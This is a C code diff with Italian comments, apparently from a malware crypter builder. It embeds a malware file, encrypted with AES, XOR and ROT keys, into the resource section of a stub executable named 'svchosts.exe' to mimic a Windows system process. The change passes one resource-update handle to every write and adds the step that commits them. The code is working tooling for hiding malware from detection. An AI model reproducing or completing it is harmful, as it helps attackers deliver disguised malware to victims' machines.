@@ -16,11 +16,9 @@ void getLen(char * path, FILE** file, long* length){
 
 } 
 
-void writeResource(int code,long length, unsigned char* resource ){
+void writeResource(HANDLE hUpdateRes,int code,long length, unsigned char* resource ){
     BOOL result;
-    HANDLE hUpdateRes;
-    char * stubPath = "svchosts.exe";
-    hUpdateRes = BeginUpdateResource(stubPath, FALSE);
+
     if (hUpdateRes == NULL)
     {
         printf("impossibile aprire lo stub per scrivere le risorse");
@@ -39,7 +37,8 @@ void writeResource(int code,long length, unsigned char* resource ){
 
 int main(int argc, char* argv[]){
 
-
+    HANDLE hUpdateRes;
+    char * stubPath = "svchosts.exe";
     unsigned char* malware;
     char * malwarePath = argv[1];
     FILE* pMalware;
@@ -90,14 +89,20 @@ int main(int argc, char* argv[]){
 
     //UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(code), NULL, malware, malwareLen);
 
-    writeResource(69 , malwareLen, malware);
-    writeResource(420, sizeof(AESkey), AESkey);
-    writeResource(421, sizeof(XORkey),XORkey);
-    writeResource(422, sizeof(ROTkey),(unsigned char*)ROTkey);
-    writeResource(123, sizeof(nAES),(unsigned char*)&nAES);
-    writeResource(124, sizeof(nXOR),(unsigned char*)(&nXOR));
-    //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato
+    hUpdateRes = BeginUpdateResource(stubPath, FALSE);
 
+    writeResource(hUpdateRes,69 , malwareLen, malware);
+
+    writeResource(hUpdateRes,420, sizeof(AESkey),AESkey);
+    writeResource(hUpdateRes,421, sizeof(XORkey),XORkey);
+    writeResource(hUpdateRes,422, sizeof(ROTkey),(unsigned char*)ROTkey);
+    writeResource(hUpdateRes,123, sizeof(nAES),(unsigned char*)&nAES);
+    writeResource(hUpdateRes,124, sizeof(nXOR),(unsigned char*)(&nXOR));
+    //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato
+    if (!EndUpdateResource(hUpdateRes, FALSE)){
+        printf("impossibile salvare le modifiche");
+        return 0;
+    }
 
     printf("\n\n\nSUCCESSO\n\n\n");
     return 0;
